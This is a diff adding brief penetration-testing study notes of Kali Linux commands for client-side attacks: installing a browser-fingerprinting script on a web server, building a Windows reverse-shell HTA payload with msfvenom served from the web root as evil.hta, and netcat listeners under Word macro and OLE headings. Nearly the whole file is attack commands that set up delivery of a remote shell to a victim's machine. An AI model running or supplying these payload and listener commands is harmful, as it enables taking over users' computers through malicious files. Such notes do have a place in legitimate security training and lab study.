@@ -1,0 +1,33 @@
+Client Fingerprinting
+
+kali@kali:/var/www/html$ sudo wget
+https://github.com/Valve/fingerprintjs2/archive/master.zip
+
+kali@kali:/var/www/html$ sudo unzip master.zip
+kali@kali:/var/www/html$ sudo mv fingerprintjs2-master/ fp
+kali@kali:/var/www/html/fp$ cat index.html 
+kali@kali:/var/www/html$ sudo chown www-data:www-data fp
+
+
+
+
+
+HTA Attack in Action 
+kali@kali:~$ sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta
+kali@kali:~$ sudo cat /var/www/html/evil.hta
+kali@kali:~$ nc -lnvp 4444
+
+
+
+
+
+Microsoft Word Macro
+Dim Str As String
+kali@kali:~$ nc -lnvp 4444
+
+
+
+
+Object Linking and Embedding
+kali@kali:~$ nc -lvnp 4444
+
